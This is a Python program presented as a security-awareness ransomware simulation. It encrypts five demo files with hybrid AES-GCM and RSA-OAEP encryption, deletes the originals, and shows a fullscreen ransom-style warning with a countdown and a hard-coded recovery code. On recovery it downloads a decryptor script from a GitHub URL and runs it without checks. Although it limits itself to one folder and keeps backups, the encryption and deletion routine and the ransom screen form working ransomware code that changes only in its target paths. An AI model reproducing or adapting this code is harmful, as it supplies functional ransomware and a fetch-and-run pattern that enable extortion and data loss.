from pathlib import Path
from datetime import datetime, timedelta
import os
import shutil
import subprocess
import sys
import tkinter as tk
from urllib.request import urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes


# ============================================================
# CONTROLLED SECURITY TRAINING DEMO
#
# This program ONLY handles the five predefined files inside:
# ~/Desktop/RansomDemo/targets
# ============================================================

ROOT = Path.home() / "Desktop" / "RansomDemo"

TARGET_DIR = ROOT / "targets"
BACKUP_DIR = ROOT / ".safety_backup"
RUNTIME_DIR = ROOT / ".runtime"

PRIVATE_KEY_FILE = RUNTIME_DIR / "private.pem"
PUBLIC_KEY_FILE = RUNTIME_DIR / "public.pem"

DECRYPTOR_FILE = RUNTIME_DIR / "demo_decrypt.py"

DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/demo_decrypt.py"
)

TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]

RECOVERY_CODE = "1234"

MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


def setup():
    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


def generate_keys():
    if PRIVATE_KEY_FILE.exists():
        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():
            PUBLIC_KEY_FILE.write_bytes(
                private_key.publickey().export_key()
            )

        return

    print("[+] Generating RSA-2048 training keys")

    key = RSA.generate(2048)

    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )

    PUBLIC_KEY_FILE.write_bytes(
        key.publickey().export_key()
    )

    try:
        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )
    except OSError:
        pass


def encrypt_file(filename):
    source = TARGET_DIR / filename

    encrypted = TARGET_DIR / (
        filename + ".unt"
    )

    backup = BACKUP_DIR / filename

    if source.is_symlink():
        print(
            f"[SKIP] {filename}: symlink rejected"
        )
        return False

    if not source.exists():

        if encrypted.exists():
            print(
                f"[INFO] {filename} already encrypted"
            )
            return True

        print(
            f"[ERROR] Missing file: {filename}"
        )

        return False

    # Preserve first clean copy.
    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )

        print(
            f"[BACKUP] {filename}"
        )

    plaintext = source.read_bytes()

    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )

    # Random AES-256 key for this file.
    aes_key = get_random_bytes(32)

    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )

    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )

    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )

    encrypted_aes_key = rsa_cipher.encrypt(
        aes_key
    )

    temporary = encrypted.with_suffix(
        encrypted.suffix + ".tmp"
    )

    try:

        with temporary.open("wb") as f:

            f.write(MAGIC)

            f.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )

            f.write(
                encrypted_aes_key
            )

            f.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )

            f.write(
                aes_cipher.nonce
            )

            f.write(
                len(tag).to_bytes(
                    1,
                    "big"
                )
            )

            f.write(tag)

            f.write(
                ciphertext
            )

        # Atomic rename.
        os.replace(
            temporary,
            encrypted
        )

        # Delete the visible original ONLY
        # after the encrypted copy was successfully written.
        source.unlink()

        print(
            f"[ENCRYPTED] "
            f"{filename} -> "
            f"{filename}.unt"
        )

        return True

    except Exception:

        if temporary.exists():
            temporary.unlink()

        raise


def encrypt_all():
    successful = 0

    for filename in TARGET_FILES:

        try:

            if encrypt_file(filename):
                successful += 1

        except Exception as error:

            print(
                f"[ERROR] {filename}: {error}"
            )

    return successful


def verify_encrypted_state():
    """
    Verify that all five files are now represented
    by .unt files and the visible originals are gone.
    """

    for filename in TARGET_FILES:

        original = (
            TARGET_DIR /
            filename
        )

        encrypted = (
            TARGET_DIR /
            (filename + ".unt")
        )

        if original.exists():
            return False

        if not encrypted.exists():
            return False

    return True


def download_decryptor():

    print(
        "[+] Downloading recovery utility"
    )

    with urlopen(
        DECRYPTOR_URL,
        timeout=15
    ) as response:

        data = response.read()

    if len(data) < 100:

        raise RuntimeError(
            "Recovery utility download failed"
        )

    temporary = (
        RUNTIME_DIR /
        "demo_decrypt.tmp"
    )

    temporary.write_bytes(
        data
    )

    os.replace(
        temporary,
        DECRYPTOR_FILE
    )


def show_warning_window():

    root = tk.Tk()

    root.title(
        "Security Awareness Training"
    )

    root.configure(
        bg="#8b0000"
    )

    root.attributes(
        "-fullscreen",
        True
    )

    root.attributes(
        "-topmost",
        True
    )

    # Emergency training exit.
    root.bind(
        "<Escape>",
        lambda event:
        root.destroy()
    )

    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )

    header = tk.Label(
        root,
        text="SECURITY AWARENESS TRAINING",
        font=(
            "Arial",
            30,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    header.pack(
        pady=(40, 5)
    )

    simulation = tk.Label(
        root,
        text=(
            "CONTROLLED RANSOMWARE "
            "SIMULATION"
        ),
        font=(
            "Arial",
            18,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    simulation.pack(
        pady=5
    )

    title = tk.Label(
        root,
        text=(
            "YOUR DEMO FILES "
            "HAVE BEEN ENCRYPTED"
        ),
        font=(
            "Arial",
            36,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    title.pack(
        pady=(30, 15)
    )

    info = tk.Label(
        root,
        text=(
            "5 training files are currently "
            "unavailable.\n\n"
            "Only files inside the controlled "
            "RansomDemo training directory "
            "were processed."
        ),
        font=(
            "Arial",
            16
        ),
        fg="white",
        bg="#8b0000",
        justify="center"
    )

    info.pack(
        pady=10
    )

    timer_title = tk.Label(
        root,
        text="TRAINING COUNTDOWN",
        font=(
            "Arial",
            15,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    timer_title.pack(
        pady=(15, 0)
    )

    timer_label = tk.Label(
        root,
        text="00:30:00",
        font=(
            "Courier",
            46,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    timer_label.pack(
        pady=5
    )

    # --------------------------------------------------------
    # VIEW FILES
    # --------------------------------------------------------

    def view_files():

        # Keep this process alive,
        # but minimize the warning window.
        root.attributes(
            "-topmost",
            False
        )

        root.iconify()

        subprocess.Popen(
            [
                "xdg-open",
                str(TARGET_DIR)
            ]
        )

    view_button = tk.Button(
        root,
        text="VIEW ENCRYPTED FILES",
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=view_files,
        padx=20,
        pady=7
    )

    view_button.pack(
        pady=12
    )

    # --------------------------------------------------------
    # RECOVERY CODE
    # --------------------------------------------------------

    code_label = tk.Label(
        root,
        text="RECOVERY CODE",
        font=(
            "Arial",
            15,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    code_label.pack(
        pady=(10, 4)
    )

    code_entry = tk.Entry(
        root,
        font=(
            "Arial",
            21
        ),
        width=16,
        justify="center",
        show="*"
    )

    code_entry.pack(
        pady=4
    )

    code_entry.focus_set()

    status_label = tk.Label(
        root,
        text="",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    status_label.pack(
        pady=8
    )

    def recover():

        code = (
            code_entry
            .get()
            .strip()
        )

        if code != RECOVERY_CODE:

            status_label.config(
                text=(
                    "INVALID RECOVERY CODE"
                )
            )

            code_entry.delete(
                0,
                tk.END
            )

            return

        status_label.config(
            text=(
                "RECOVERY CODE ACCEPTED"
            )
        )

        root.update_idletasks()

        try:

            status_label.config(
                text=(
                    "DOWNLOADING "
                    "RECOVERY UTILITY..."
                )
            )

            root.update_idletasks()

            download_decryptor()

            status_label.config(
                text=(
                    "STARTING RECOVERY..."
                )
            )

            root.update_idletasks()

            subprocess.Popen(
                [
                    sys.executable,
                    str(DECRYPTOR_FILE)
                ]
            )

            # Encryption warning disappears.
            root.destroy()

        except Exception as error:

            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )

    recover_button = tk.Button(
        root,
        text="RECOVER FILES",
        font=(
            "Arial",
            16,
            "bold"
        ),
        command=recover,
        padx=25,
        pady=8
    )

    recover_button.pack(
        pady=8
    )

    code_entry.bind(
        "<Return>",
        lambda event:
        recover()
    )

    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY  •  "
            "TARGET: ~/Desktop/"
            "RansomDemo/targets  •  "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            12
        ),
        fg="white",
        bg="#8b0000"
    )

    footer.pack(
        side="bottom",
        pady=20
    )

    def update_timer():

        remaining = (
            end_time -
            datetime.now()
        )

        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )

        hours = (
            seconds // 3600
        )

        minutes = (
            seconds % 3600
        ) // 60

        secs = (
            seconds % 60
        )

        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{secs:02d}"
            )
        )

        if seconds > 0:

            root.after(
                1000,
                update_timer
            )

        else:

            status_label.config(
                text=(
                    "TRAINING TIMER EXPIRED"
                )
            )

    update_timer()

    root.mainloop()


def main():

    setup()

    generate_keys()

    successful = encrypt_all()

    print(
        f"[+] Encryption status: "
        f"{successful}/"
        f"{len(TARGET_FILES)}"
    )

    if not verify_encrypted_state():

        print()
        print(
            "[ERROR] Not all demo files "
            "were encrypted."
        )

        print(
            "[ERROR] Warning GUI will NOT "
            "be displayed."
        )

        print()
        print(
            f"Check: {TARGET_DIR}"
        )

        return

    show_warning_window()


if __name__ == "__main__":
    main()
